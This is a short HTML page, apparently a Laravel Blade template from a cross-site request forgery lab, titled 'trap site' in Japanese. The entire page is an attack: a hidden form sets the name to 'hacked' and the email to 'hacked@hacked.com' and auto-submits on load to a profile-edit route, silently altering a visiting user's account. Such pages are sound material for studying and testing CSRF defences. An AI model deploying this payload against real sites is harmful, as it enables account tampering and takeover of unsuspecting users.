<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>罠サイト</h1>
    <form action="{{ route('post_csrf_rem_edit') }}" method="post" name="f1">
        <input type="hidden" name="new_name" value="hacked">
        <input type="hidden" name="new_email" value="hacked@hacked.com">
    </form>
    <script>
        document.forms['f1'].submit();
    </script>
</body>
</html>